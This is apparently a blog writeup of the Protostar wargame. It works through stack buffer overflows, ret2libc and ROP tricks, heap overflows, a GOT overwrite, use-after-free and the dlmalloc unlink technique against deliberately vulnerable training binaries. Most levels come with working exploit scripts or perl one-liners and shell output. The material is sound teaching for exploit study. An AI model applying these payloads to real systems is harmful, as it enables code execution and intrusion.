---
title: 'Protostar Wargame Writeup'
date: 2019-01-01T00:00:00.000Z
excerpt: >-
  Solving the Protostar wargame: stack buffer overflows, format string bugs, heap exploitation, and a network challenge.
tags:
  - wargame
  - writeup
  - pwn
  - protostar
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Stack0

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

The `gets()` function reads input into a 64-byte buffer with no bounds checking. The `modified` variable sits right after `buffer` on the stack, so writing more than 64 bytes overwrites `modified`.

### Exploit

```python
import os
import subprocess
from struct import *

payload = ""
payload += "A"*64
payload += "B"*4

p = subprocess.Popen("./stack0", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
print p.communicate(payload)[0]
```

---

## Stack1

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Input comes from a command-line argument via `strcpy`. The target value for `modified` is `0x61626364`. Since it's stored little-endian, the input needs to be in `"abcd"` order, not `"dcba"`.

### Exploit

```python
import os
import subprocess
from struct import *

p = lambda x:pack("<L", x)

payload = ""
payload += "A"*64
payload += p(0x61626364)

os.system("./stack1" + " " + payload)
```

---

## Stack2

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Input is read from the `GREENIE` environment variable. The target value is `0x0d0a0d0a` (CRLF bytes). Since these are non-printable characters, we need to pack them as a little-endian integer.

### Exploit

```python
from subprocess import Popen, PIPE
from struct import pack
import os

p32 = lambda x:pack("<L", x)

payload = ""
payload += "A"*64
payload += p32(0x0d0a0d0a)

os.environ["GREENIE"]=payload

p = Popen("./stack2", stdin=PIPE, stdout=PIPE)
print p.communicate()[0]
```

---

## Stack3

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

The function pointer `fp` is stored on the stack right next to `buffer`. Overflowing `buffer` to overwrite `fp` with the address of the `win()` function makes `win()` run when `fp()` is called.

### Exploit

```python
import os
from subprocess import Popen, PIPE
from struct import *

p = lambda x:pack("<L", x)
win = 0x8048486

payload = ""
payload += "A"*64
payload += p(win)

p = Popen("./stack3", stdin=PIPE, stdout=PIPE)
print p.communicate(payload)[0]
```

---

## Stack4

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

A classic return-address overwrite. The buffer is 64 bytes, followed by a saved frame pointer (4 bytes), then the saved return address. We overwrite `ret` with the address of `win()`.

### Exploit

```bash
(perl -e 'print "A"x64, "B"x4, "C"x4, "\x56\x84\x04\x08"'; cat) | ./stack4

code flow successfully changed
```

---

## Stack5

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

This time there's no win function. Since NX is disabled, we can place shellcode directly in the buffer and execute it. We build the payload using a ret2libc chain to `system()`.

### Exploit

```bash
(perl -e 'print "A"x72, "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack5
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
```

Those addresses correspond to `system()` and `/bin/sh` in libc - a textbook ret2libc attack.

---

## Stack6

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;
  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Stack6 blocks return addresses in the `0xbf000000` range (the stack region), preventing a direct jump to shellcode on the stack. The bypass is ret2libc - point the return address at `system()` in libc, which is outside the blocked range.

### Exploit

```bash
(perl -e 'print "A"x76, "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack6
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
```

---

## Stack7

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Stack7 blocks any address starting with `0xb0000000`, which knocks out not only the stack (`0xbf...`) but most of libc (`0xb7...`) as well. The solution is to pivot through a ROP gadget located in the binary's own `.text` section before landing in a ret2libc chain. The `ret` gadget at `0x080485ae` is useful here.

### Exploit

```bash
(perl -e 'print "A"x76, "\xae\x85\x04\x08", "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack7
input path please:
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...

id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
```

The gadget at `0x080485ae` is a `ret` instruction in the binary's text segment, used to slip past the filter before landing in `system()`.

---

## Heap0

A simple heap overflow caused by `strcpy` writing past an allocated chunk's boundary into an adjacent structure. Overwriting a function pointer in that adjacent object redirects execution to `winner()`.

### Exploit

```bash
./heap0 $(perl -e 'print "A"x64, "B"x16, "\xb6\x84\x04\x08"')
```

---

## Heap1

Two heap-allocated structures sit adjacent in memory, each holding a name pointer and a priority field. Memory layout:

```
| prev | size | prio | name* |
i1      | NULL | 0x11 |  1   | addr  |
name    | NULL | 0x11 |     AAAA     |
i2      | NULL | 0x11 |  2   | addr  |
name    | NULL | 0x11 |     BBBB     |
```

Overflowing `i1->name` far enough lets us overwrite `i2`'s `name` pointer with `puts@GOT`. Then writing the address of `winner()` into `i2->name` triggers the GOT overwrite when `puts` is called.

```
strcpy(i1->name, argv[1])  ->  A*20 + puts_got  (overwrites i2->name*)
strcpy(i2->name, argv[2])  ->  &winner          (overwrites the puts GOT entry)
```

### Exploit

```bash
./heap1 $(perl -e 'print "A"x20, "\x1c\xa0\x04\x08"') $(perl -e 'print "\xe6\x84\x04\x08"')
and we have a winner @ 1605236809
```

---

## Heap2

### Source

```c
struct auth {
    char name[32];
    int auth;
};

struct auth *auth;
char *service;
```

The program manages an `auth` structure and a `service` pointer. When `free(auth)` is called, the memory is returned to the heap allocator, but the pointer itself isn't reset (use-after-free). If a new `service` string is then allocated with `strdup`, it can land in the same freed chunk if the allocation size matches.

### Analysis

```c
char line[128];

    while(1) {
        printf("[ auth = %p, service = %p ]\n", auth, service);

        if(fgets(line, sizeof(line), stdin) == NULL) break;
```

A 128-byte buffer, allowing input of any length up to that via fgets.

```c
        if(strncmp(line, "auth ", 5) == 0) {
            auth = malloc(sizeof(auth));
            memset(auth, 0, sizeof(auth));
            if(strlen(line + 5) < 31) {
                strcpy(auth->name, line + 5);
            }
        }
```

Entering `"auth "` + a string allocates a chunk of the given size and memsets it. If the length is under 31 bytes, the data is copied into `auth->name`.

```c
        if(strncmp(line, "reset", 5) == 0) {
            free(auth);
        }
        if(strncmp(line, "service", 6) == 0) {
            service = strdup(line + 7);
        }
```

`reset` frees `auth`, and `service` overwrites the `service` pointer with a new string.

```c
        if(strncmp(line, "login", 5) == 0) {
            if(auth->auth) {
                printf("you have logged in already!\n");
            } else {
                printf("please enter your password\n");
            }
        }
```

Entering `login` logs in if `auth->auth` has a value. But only 30 bytes are writable - so how can we put a value into `auth->auth`?

Exploit sequence:
1. `auth AAAA...` - allocate the auth structure, fill the name field
2. `service` - allocate an adjacent chunk for service
3. `reset` - free auth (the pointer is not reset)
4. `service` - strdup allocates into the freed auth chunk, overwriting `auth->auth`
5. `login` - succeeds since auth->auth is now non-zero

```
auth AAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804b980, service = (nil) ]
service
[ auth = 0x804b980, service = 0x804b990 ]
reset
[ auth = 0x804b980, service = 0x804b990 ]
service
[ auth = 0x804b980, service = 0x804b980 ]
login
please enter your password
service
[ auth = 0x804b980, service = 0x804b9a0 ]
login
you have logged in already!
```

---

## Heap3

### Source

```c
void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

This challenge demonstrates the classic dlmalloc unlink exploit. Heap layout after allocation:

```
0x804c000:  0x00000000  0x00000029  0x41414141  ...
0x804c020:  ...         0x00000029  0x42424242  ...
0x804c050:  ...         0x00000029  0x43434343  ...
```

Each chunk has an 8-byte header (`prev_size` + `size`), followed by `fd` and `bk` pointers (used only when freed). By overflowing chunk `c` and planting a fake chunk at the chunk boundary, the unlink macro that fires during `free()` gives us a write-what-where primitive: writing an arbitrary 4-byte value to an arbitrary address. We use this to overwrite `printf@GOT` with `winner()`.

The `malloc_chunk` structure:

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      prev_size;
  INTERNAL_SIZE_T      size;
  struct malloc_chunk* fd;
  struct malloc_chunk* bk;
};
```

![Heap chunk layout - memory layout of the Red/Green/Blue objects before free](/images/writeups/protostar/heap-structure.png)
